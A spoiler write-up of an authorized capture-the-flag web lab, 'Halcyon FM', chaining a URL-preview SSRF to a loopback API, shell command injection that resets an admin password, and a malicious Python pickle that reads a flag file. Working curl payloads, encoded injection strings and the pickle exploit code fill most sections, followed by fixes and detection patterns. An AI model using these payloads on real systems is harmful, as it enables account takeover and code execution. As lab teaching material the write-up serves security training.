<div align="center">

# 📻 HALCYON FM

### *Loopback Echoes*

`WEBVERSE PRO` &nbsp;·&nbsp; `HARD WEB LAB` &nbsp;·&nbsp; `LINUX` &nbsp;·&nbsp; `10.100.179.14`

**Public preview → loopback API → staff console → flag**

</div>

> [!WARNING]
> **Full spoiler walkthrough.** This authorized WebVerse Pro CTF write-up includes every discovered host, endpoint, credential, payload, response marker, and the full flag.

> [!NOTE]
> Halcyon FM is a lesson in chained trust failures: a public URL preview reads loopback responses, an internal diagnostic endpoint shells out with attacker input, and a separate playout console trusts Python pickle data.

---

## 🧭 Snapshot

| Field | Value |
|---|---|
| **Platform** | WebVerse Pro |
| **Target** | `10.100.179.14` |
| **Public host** | `halcyonfm.local` |
| **Staff console** | `studio.halcyonfm.local` |
| **Exposed service** | `80/tcp` — nginx |
| **Internal service** | `127.0.0.1:8080` — `halcyon-ops-api` `v1.4.2` |
| **Admin** | `mfaro` / Marlow Faro / ID `1` |
| **Password set through the chain** | `M4rlowReset2026` |
| **Flag** | `WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}` |

---

## ⚡ TL;DR

1. `/demo` contains a server-side URL preview: `POST /api/shows/import-preview`.
2. `is_dev: true` makes the preview return the full upstream body: **full-read SSRF**.
3. The SSRF reads the loopback ops API and its Swagger schema.
4. Swagger exposes `/api/v1/users`, a POST-only password reset, and a command-injectable stream probe.
5. Injecting local curl through the stream probe changes admin ID `1`'s password.
6. The credential logs into `studio.halcyonfm.local`.
7. The studio playlist importer Base64-decodes and runs `pickle.loads` on `.hpl` files.
8. A valid-shaped pickle reads `/home/halcyon/flag.txt` and the page reflects the flag.

---

## 🛰️ Attack Surface

```text
                              Internet-facing surface

  10.100.179.14:80 / nginx
            │
            ├── halcyonfm.local
            │     └── POST /api/shows/import-preview
            │             └── server-side URL fetch
            │
            └── studio.halcyonfm.local
                  ├── POST /login
                  ├── GET  /dashboard
                  ├── GET  /playlists/export
                  └── POST /playlists/import

                        Not routed by nginx

                  127.0.0.1:8080
                  ├── GET  /swagger.json
                  ├── GET  /api/v1/users
                  ├── POST /api/v1/{userid}/change-password
                  └── GET  /api/v1/diagnostics/stream-probe
```

| Surface | Access | Finding |
|---|---|---|
| `halcyonfm.local` | Anonymous | URL-preview SSRF with developer-mode body reflection |
| `127.0.0.1:8080` | Loopback-only | Internal Swagger and privileged API routes |
| `stream-probe` | SSRF-reachable GET | Command injection via `stream_url` |
| `studio.halcyonfm.local` | Admin session | Base64-encoded pickle import |

---

## 🧩 Attack Chain

| # | Transition | Primitive | Proof |
|---:|---|---|---|
| 1 | Public site → ops API | Full-read SSRF | Loopback JSON body returned to anonymous caller |
| 2 | Ops API → account data | Internal API exposure | `/api/v1/users` returns admin `mfaro` |
| 3 | GET-only SSRF → POST action | Command injection | `BMCI_OK` marker from shell |
| 4 | Internal API → admin access | Password reset | `{"ok":true,"userid":1}` |
| 5 | Credential → console | Vhost discovery and login | Session cookie + `/dashboard` redirect |
| 6 | Playlist upload → code | Insecure Python pickle | Imported object reflects file read |
| 7 | Studio container → flag | Local file read | `WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}` |

---

## 🕸️ Visual Attack Graph

```mermaid
flowchart LR
    A["Anonymous listener"] -->|"POST feed_url + is_dev:true"| B["halcyonfm.local\npublic preview"]
    B -->|"GET internal URL"| C["127.0.0.1:8080\nops API"]
    C -->|"Swagger + users"| B
    B -->|"GET stream-probe\nwith injected stream_url"| C
    C -->|"shell-built curl"| D["Local POST\nchange-password"]
    D -->|"mfaro : M4rlowReset2026"| E["studio.halcyonfm.local\nplayout console"]
    E -->|"Base64 .hpl upload"| F["pickle.loads"]
    F -->|"open(flag.txt).read()"| G["WEBVERSE{...}"]

    classDef public fill:#0f2a44,stroke:#61d4c5,color:#ffffff;
    classDef internal fill:#44244a,stroke:#f79ab0,color:#ffffff;
    classDef dangerous fill:#5a3820,stroke:#f8cd7b,color:#ffffff;
    class A,B public;
    class C,E internal;
    class D,F,G dangerous;
```

---

# 📖 Walkthrough Narrative

## 1. Enumeration First

The reconnaissance bootstrap found a single exposed service:

```text
80/tcp  open  http  nginx
```

The raw IP revealed the first host to use:

```text
http://10.100.179.14  →  302 Found
Location: http://halcyonfm.local/
```

Every request uses curl's resolver override rather than changing `/etc/hosts`:

```bash
--resolve 'halcyonfm.local:80:10.100.179.14'
```

The public radio site exposes three visible routes:

```text
/           Home
/schedule   Schedule
/demo       Submit a show
```

`/demo` contains the decisive clue:

> “Add a link to a demo mix or your show artwork and we will pull a preview so you can check it resolves before you send.”

> [!TIP]
> A public feature that “fetches the link server-side” should immediately be examined as a potential SSRF sink.

---

## 2. The Public Preview Is a Full-Read SSRF

`/static/js/demo.js` reveals the preview request exactly:

```javascript
fetch("/api/shows/import-preview", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ feed_url: url, is_dev: false }),
})
```

It also reveals the hidden response behavior:

```javascript
// The default producer view only reports reachability. The full body is
// returned only when the request asks for the developer view.
if (d.body) {
  body.textContent = d.body;
}
```

Set `is_dev` to `true`, send a loopback URL, and the public endpoint returns the internal service's full body:

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

```json
{
  "body": "{\"docs\":\"/docs/\",\"service\":\"halcyon-ops-api\",\"spec\":\"/swagger.json\",\"status\":\"ok\",\"version\":\"1.4.2\"}\n",
  "content_type": "application/json",
  "message": "reachable",
  "reachable": true,
  "status": 200,
  "url": "http://127.0.0.1:8080/"
}
```

The public app can reach loopback, and `is_dev` reflects the sensitive response body to an anonymous caller.

---

## 3. Swagger Turns the Internal API into an Exploit Map

### Read the specification

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/swagger.json","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

Relevant Swagger routes:

| Method | Route | Description |
|---|---|---|
| `GET` | `/api/v1/users` | List all station accounts |
| `POST` | `/api/v1/{userid}/change-password?new_password=<value>` | Set a user password |
| `GET` | `/api/v1/diagnostics/stream-probe?stream_url=<value>` | Probe a stream URL through curl |

The password route is intentionally POST-only and documents `405 Use POST` for GET requests. The SSRF primitive itself only performs GET, so a bridge is required.

### Dump users

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/users","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

```json
{
  "users": [
    {
      "email": "marlow@halcyonfm.local",
      "full_name": "Marlow Faro",
      "id": 1,
      "last_login": "2026-07-10T08:14:00",
      "role": "admin",
      "username": "mfaro"
    },
    {
      "email": "daria@halcyonfm.local",
      "full_name": "Daria Wells",
      "id": 2,
      "last_login": "2026-07-11T21:02:00",
      "role": "staff",
      "username": "dwells"
    },
    {
      "email": "rowan@halcyonfm.local",
      "full_name": "Rowan Kline",
      "id": 3,
      "last_login": "2026-07-09T02:41:00",
      "role": "staff",
      "username": "rkline"
    },
    {
      "email": "tomas@halcyonfm.local",
      "full_name": "Tomas Vano",
      "id": 4,
      "last_login": "2026-07-08T17:55:00",
      "role": "staff",
      "username": "tvano"
    }
  ]
}
```

Target account:

```text
Marlow Faro
username: mfaro
userid:   1
```

---

## 4. Turning GET-only SSRF into the Required POST

The stream probe interpolates `stream_url` into a shell-built curl command. First, prove command execution without changing target state:

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http%3A%2F%2F127.0.0.1%3A9%2F%3Bprintf%20BMCI_OK%3B%23","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

Decoded parameter:

```text
http://127.0.0.1:9/;printf BMCI_OK;#
```

Reflected result:

```json
{
  "result": "000 0.000211sBMCI_OK",
  "stream_url": "http://127.0.0.1:9/;printf BMCI_OK;#"
}
```

`BMCI_OK` demonstrates shell interpretation in-band.

### Password-reset bridge

Use the alphanumeric password `M4rlowReset2026` to avoid unnecessary quoting layers:

```bash
curl -sS \
  --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http%3A%2F%2F127.0.0.1%3A9%2F%3Bcurl%20-sS%20-X%20POST%20%27http%3A%2F%2F127.0.0.1%3A8080%2Fapi%2Fv1%2F1%2Fchange-password%3Fnew_password%3DM4rlowReset2026%27%3Bprintf%20BMRESET_OK%3B%23","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```

Decoded injected command:

```bash
curl -sS -X POST \
  'http://127.0.0.1:8080/api/v1/1/change-password?new_password=M4rlowReset2026'
printf BMRESET_OK
```

```json
{
  "result": "000 0.000110s{\"ok\":true,\"userid\":1}\nBMRESET_OK",
  "stream_url": "http://127.0.0.1:9/;curl -sS -X POST 'http://127.0.0.1:8080/api/v1/1/change-password?new_password=M4rlowReset2026';printf BMRESET_OK;#"
}
```

> [!IMPORTANT]
> The injection executes in the **web** container, while `/home/halcyon/flag.txt` exists in the **studio** container. The purpose of this stage is only to obtain authenticated console access.

---

## 5. Finding and Logging into the Studio Console

A compact virtual-host differential separates the console from nginx's default redirect behavior:

| Host | Result |
|---|---|
| `playout.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `console.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `staff.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `backstage.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `ops.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `admin.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `dashboard.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| `bm-random-a91f.halcyonfm.local` | `302` → `http://halcyonfm.local/` |
| **`studio.halcyonfm.local`** | **`302` → `http://studio.halcyonfm.local/login`** |

Login form:

```html
<form method="post" action="/login" class="login-form" autocomplete="off">
  <input type="text" name="username" required autofocus spellcheck="false">
  <input type="password" name="password" required>
  <button type="submit">Sign in</button>
</form>
```

Authenticate as the reset administrator:

```bash
rm -f /tmp/halcyonfm-studio.cookies

curl -sS -i \
  --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -c /tmp/halcyonfm-studio.cookies \
  --data-urlencode 'username=mfaro' \
  --data-urlencode 'password=M4rlowReset2026' \
  'http://studio.halcyonfm.local/login'
```

```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ1aWQiOjF9.alaagg.Aw4B90GCeDHEKTsjlzfLYI89mOM; HttpOnly; Path=/
```

The dashboard identifies **Marlow Faro — admin** and exposes a playlist uploader:

```html
<form method="post" action="/playlists/import" enctype="multipart/form-data" class="import-form">
  <input type="file" name="bundle" accept=".hpl,application/octet-stream" required>
  <button type="submit">Import bundle</button>
</form>
```

---

## 6. Reverse Engineering the Playlist Format Safely

Download a genuine `.hpl` bundle before building an exploit. Do not call `pickle.loads` on it locally; decode it and use `pickletools` instead.

```bash
curl -sS \
  --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -b /tmp/halcyonfm-studio.cookies \
  'http://studio.halcyonfm.local/playlists/export' \
  -o /tmp/halcyonfm-export.hpl
```

```http
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=overnight.hpl
Content-Length: 132
```

The attachment body is Base64:

```text
gASVVwAAAAAAAAB9lCiMBG5hbWWUjBFPdmVybmlnaHQgQW1iaWVudJSMBnRyYWNrc5RdlCiMCWludHJvLWJlZJSMCGZpZWxkLTAxlIwIZHJvbmUtMDKUZYwEbG9vcJSIdS4=
```

```bash
python3 - <<'PY'
from pathlib import Path
import base64

raw = Path('/tmp/halcyonfm-export.hpl').read_bytes()
Path('/tmp/halcyonfm-export.pickle').write_bytes(base64.b64decode(raw))
PY

python3 -m pickletools /tmp/halcyonfm-export.pickle
```

The protocol-4 pickle holds:

```python
{
    'name': 'Overnight Ambient',
    'tracks': ['intro-bed', 'field-01', 'drone-02'],
    'loop': True,
}
```

The disassembly confirms the expected keys and values:

```text
0:  \x80 PROTO      4
11: }    EMPTY_DICT
14: \x8c     SHORT_BINUNICODE 'name'
21: \x8c     SHORT_BINUNICODE 'Overnight Ambient'
41: \x8c     SHORT_BINUNICODE 'tracks'
50: ]        EMPTY_LIST
53: \x8c         SHORT_BINUNICODE 'intro-bed'
65: \x8c         SHORT_BINUNICODE 'field-01'
76: \x8c         SHORT_BINUNICODE 'drone-02'
88: \x8c     SHORT_BINUNICODE 'loop'
95: \x88     NEWTRUE
96: u        SETITEMS
97: .    STOP
```

---

## 7. Pickle Deserialization and Flag Collection

`pickle.loads` is code execution, not safe parsing. Keep the expected dictionary/list/boolean structure and replace only `name` with an object whose `__reduce__` reads the target file during deserialization:

```python
import base64
import pickle
from pathlib import Path

class FlagName:
    def __reduce__(self):
        return (eval, ("open('/home/halcyon/flag.txt','r').read()",))

bundle = {
    'name': FlagName(),
    'tracks': ['intro-bed'],
    'loop': False,
}

Path('/tmp/halcyonfm-flag.hpl').write_bytes(
    base64.b64encode(pickle.dumps(bundle, protocol=4))
)
```

Upload the structure-valid bundle through the authenticated import form:

```bash
curl -sS -i \
  --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -b /tmp/halcyonfm-studio.cookies \
  -c /tmp/halcyonfm-studio.cookies \
  -F 'bundle=@/tmp/halcyonfm-flag.hpl;filename=flag.hpl;type=application/octet-stream' \
  'http://studio.halcyonfm.local/playlists/import'
```

The console reflects the deserialized object in its dashboard response:

```html
<div class="import-result mono">Imported playlist: {'name': 'WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}', 'tracks': ['intro-bed'], 'loop': False}</div>
```

<div align="center">

## 🏁 Flag Captured

```text
WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}
```

</div>

---

## 🧰 Command Palette

<details>
<summary><b>🔎 Public preview and SSRF discovery</b></summary>

```bash
curl -sS -i --resolve 'halcyonfm.local:80:10.100.179.14' \
  'http://halcyonfm.local/'

curl -sS --resolve 'halcyonfm.local:80:10.100.179.14' \
  'http://halcyonfm.local/static/js/demo.js'

curl -sS --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```
</details>

<details>
<summary><b>🛰️ Swagger and internal users</b></summary>

```bash
curl -sS --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/swagger.json","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'

curl -sS --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/users","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```
</details>

<details>
<summary><b>🧪 Command injection and POST bridge</b></summary>

```bash
curl -sS --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http%3A%2F%2F127.0.0.1%3A9%2F%3Bprintf%20BMCI_OK%3B%23","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'

curl -sS --resolve 'halcyonfm.local:80:10.100.179.14' \
  -H 'Content-Type: application/json' \
  --data '{"feed_url":"http://127.0.0.1:8080/api/v1/diagnostics/stream-probe?stream_url=http%3A%2F%2F127.0.0.1%3A9%2F%3Bcurl%20-sS%20-X%20POST%20%27http%3A%2F%2F127.0.0.1%3A8080%2Fapi%2Fv1%2F1%2Fchange-password%3Fnew_password%3DM4rlowReset2026%27%3Bprintf%20BMRESET_OK%3B%23","is_dev":true}' \
  'http://halcyonfm.local/api/shows/import-preview'
```
</details>

<details>
<summary><b>📻 Console authentication, export, and pickle import</b></summary>

```bash
curl -sS -i --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -c /tmp/halcyonfm-studio.cookies \
  --data-urlencode 'username=mfaro' \
  --data-urlencode 'password=M4rlowReset2026' \
  'http://studio.halcyonfm.local/login'

curl -sS --resolve 'studio.halcyonfm.local:80:10.100.179.14' \
  -b /tmp/halcyonfm-studio.cookies \
  'http://studio.halcyonfm.local/playlists/export' \
  -o /tmp/halcyonfm-export.hpl
```
</details>

---

## 🔐 Key Lessons

| Lesson | What Halcyon FM demonstrates |
|---|---|
| **Loopback is not authorization** | SSRF lets public code reach services bound to `127.0.0.1`. |
| **Debug flags are security boundaries** | Client-controlled `is_dev` exposed upstream bodies. |
| **OpenAPI accelerates exploitation** | Swagger made methods, routes, and required parameters explicit. |
| **A narrow injection can be enough** | One local POST replaced the need for a reverse shell. |
| **HTTP verbs are not access control** | GET-only SSRF became POST capability through another endpoint. |
| **Pickle is executable serialization** | `pickle.loads` must never consume user-controlled input. |
| **Separation needs least privilege** | The web container could not read the flag; studio context could. |

---

## 🛡️ Defensive Takeaways

### Fix the public preview

- Allow only approved external destinations and schemes.
- Resolve hostnames and block loopback, private, link-local, reserved, and metadata ranges.
- Revalidate every redirect target.
- Never return upstream bodies to anonymous callers.
- Remove `is_dev` from untrusted request input.

### Fix the ops API

- Require authenticated, authorized identity on every route, including loopback routes.
- Treat network locality as exposure reduction, not authentication.
- Remove or minimize the user-list response.
- Require a real authorized admin workflow for password resets.

### Fix stream diagnostics

- Use a native HTTP client instead of shelling out.
- If a process is unavoidable, pass a fixed executable and argument array; never concatenate a shell string.
- Strictly validate stream URLs and enforce timeouts.

### Fix playlist import

- Replace pickle with JSON plus a strict schema.
- Reject Base64 input that is not expected data.
- Run the playout process with least privilege.
- Do not reflect deserialized object representations in responses.

### Detection ideas

| Signal | Why it matters |
|---|---|
| Preview fetches for `127.0.0.1`, `localhost`, RFC1918, or link-local ranges | SSRF attempt |
| Requests with `is_dev=true` | Attempt to access hidden response behavior |
| `stream_url` containing `;`, `|`, `$(`, or backticks | Command-injection attempt |
| Internal password resets without normal session context | SSRF-to-action bridge |
| `.hpl` uploads containing Base64 pickle magic bytes | Unsafe-deserialization attempt |

---

<div align="center">

### ✅ Halcyon FM solved — full chain complete

**`WEBVERSE{p1ckl3d_th3_*******_l00pb4ck_8080}`**

</div>
